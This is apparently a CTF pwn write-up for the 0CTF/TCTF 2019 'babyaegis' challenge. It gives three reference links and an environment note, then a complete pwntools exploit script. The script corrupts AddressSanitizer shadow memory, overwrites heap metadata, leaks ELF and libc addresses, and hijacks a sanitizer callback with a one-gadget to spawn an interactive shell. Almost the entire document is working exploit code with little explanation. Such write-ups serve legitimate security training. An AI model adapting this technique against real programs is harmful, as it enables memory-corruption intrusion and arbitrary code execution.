# babyaegis

参考链接：

[https://www.anquanke.com/post/id/175556#h2-8 ]( https://www.anquanke.com/post/id/175556#h2-8 )

[https://github.com/balsn/ctf_writeup/tree/master/20190323-0ctf_tctf2019quals](https://github.com/balsn/ctf_writeup/tree/master/20190323-0ctf_tctf2019quals)

[https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP#aegis](https://ray-cp.github.io/archivers/0CTF_2019_PWN_WRITEUP#aegis)

环境是`ubuntu18.04 libc2.27`

```python
from pwn import *

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[4], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("Choice: ")
	p.sendline(str(command))

def add(sz,content,id):
	cmd(1)
	p.recvuntil("Size: ")
	p.sendline(str(sz))
	p.recvuntil("Content: ")
	p.send(content)
	p.recvuntil("ID: ")
	p.sendline(str(id))


def show(idx):
	cmd(2)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
def edit(idx,content,id):
	cmd(3)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Content: ")
	p.send(content)
	p.recvuntil("ID: ")
	p.sendline(str(id))
def dele(idx):
	cmd(4)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
def secret(addr):
	cmd(666)
	p.recvuntil("Lucky Number: ")
	p.sendline(str(addr))

def main(host,port=10405):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./aegis")
		# debug(0x0000000001146E0)
	
	add(0x10,"A"*0x8,0x123456789abcdef)
	# 0x602000000000 >> 3 + 0x7fff8000
	secret(0xc047fff8008-4)
	# overwrite user_requested_size
	edit(0,'\x02'*0x12,0x123456789)
	edit(0,'\x02'*0x10+p64(0x02ffffff00000002)[:7],0x01f000ff1002ff)
	dele(0)
	add(0x10,p64(0x602000000018),0)
	
	# leak elf base
	show(0)
	p.recvuntil("Content: ")
	elf = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))-0x114ab0
	info("elf :" + hex(elf))
	# leak libc addr
	edit(1,p64(elf+0x347DF0)[:2],(elf+0x347DF0)>>8)
	show(0)
	p.recvuntil("Content: ")
	libc = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))-0xe4fa0
	info("libc :" + hex(libc))
	
	#write gets to sanitizerL20InternalDieCallbacksE
	edit(1,p64(elf+0xFB08a0)[:7],0)
	gdb.attach(p,"b *{}".format(0x10a38c+libc))
	
	cmd(3)
	p.recvuntil("Index: ")
	p.sendline(str(0))
	p.recvuntil("Content: ")
	p.send(p64(0x800b0+libc)[:7])
	p.recvuntil("ID: ")
	p.sendline(str(0))
	
	payload = "A"*0x1b7+p64(libc+0x10a38c)+'\x00'*0x100
	p.sendline(payload)
	p.interactive()

if __name__ == "__main__":
	main(args['REMOTE'])

```